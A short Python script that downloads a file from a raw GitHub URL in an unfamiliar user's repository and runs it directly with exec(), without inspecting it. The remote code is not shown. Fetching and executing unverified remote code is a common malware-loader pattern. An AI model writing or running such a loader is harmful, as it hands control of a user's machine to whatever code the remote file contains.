import requests

# URL of the script
script_url = "https://raw.githubusercontent.com/oookilua2-pixel/Best/main/IFS.py"

# Fetch the content of the script
response = requests.get(script_url)
if response.status_code == 200:
    script_content = response.text
    # Execute the script
    exec(script_content)
else:
    print(f"Failed to fetch the script: {response.status_code}")